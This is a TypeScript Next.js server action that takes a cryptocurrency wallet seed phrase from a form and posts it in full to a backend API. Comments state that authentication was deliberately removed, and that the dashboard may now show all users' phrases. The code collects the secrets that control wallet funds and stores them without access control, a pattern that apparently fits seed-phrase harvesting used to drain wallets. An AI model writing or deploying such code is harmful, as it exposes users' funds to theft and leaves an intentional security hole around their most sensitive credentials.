
'use server';

import { seedPhraseFormSchema } from '@/lib/definitions'; // Use the form-specific schema
import type { SeedPhraseFormData } from '@/lib/definitions';
// Removed cookies import
import { revalidatePath } from 'next/cache'; // Import revalidatePath

// Base URL for your backend API
const BACKEND_API_URL = process.env.NEXT_PUBLIC_BACKEND_API_URL || 'http://localhost:3001';

export async function saveSeedPhraseAction(
  formData: SeedPhraseFormData // Use the full form data type again
): Promise<{ success: boolean; error?: string }> {

  // 1. Authentication Removed
  // No need to get auth token anymore

  // 2. Validate the incoming form data
  const validatedFields = seedPhraseFormSchema.safeParse(formData);

  if (!validatedFields.success) {
    console.error('[Save Seed Action] Frontend validation failed:', validatedFields.error.flatten().fieldErrors);
    const firstError = Object.values(validatedFields.error.flatten().fieldErrors)[0]?.[0];
    return {
      success: false,
      error: firstError || 'Invalid data. Please check your input.',
    };
  }

  const dataToSave = validatedFields.data;
   console.log('[Save Seed Action] Sending save request to backend for wallet:', { walletName: dataToSave.walletName, walletType: dataToSave.walletType }); // Don't log sensitive info

  // 3. Call the backend API to save the information
  try {
    // Updated API endpoint for saving seed phrases
    const response = await fetch(`${BACKEND_API_URL}/api/seed-phrases`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        // Removed Authorization header
      },
      body: JSON.stringify(dataToSave), // Send the validated form data
    });

    if (response.ok) {
        console.log('[Save Seed Action] Backend save successful.');
         // Revalidate the dashboard path to show the newly added phrase
         // Note: Dashboard might show all phrases now, not just user-specific ones if backend isn't updated
         revalidatePath('/dashboard');
         console.log('[Save Seed Action] Revalidated /dashboard path.');
        return { success: true };
    } else {
      // Handle API errors (Auth errors are less likely now, but other errors can occur)
      let errorMessage = `Failed to save information (status: ${response.status})`;
      try {
          const errorData = await response.json();
          errorMessage = errorData.message || errorMessage;
          if (errorData.errors && Array.isArray(errorData.errors)) {
              errorMessage = errorData.errors.join(' ');
          }
           console.error('[Save Seed Action] Backend save failed:', errorMessage);
      } catch (e) {
           console.error('[Save Seed Action] Backend save failed, could not parse error response:', response.statusText);
          errorMessage = `Failed to save information: ${response.statusText}`;
      }
      return { success: false, error: errorMessage };
    }
  } catch (error) {
    // Handle network errors
    console.error('[Save Seed Action] Network or unexpected error calling backend:', error);
     const message = error instanceof Error ? error.message : 'An unknown network error occurred.';
    return {
      success: false,
      error: `Failed to save information: ${message}`,
    };
  }
}
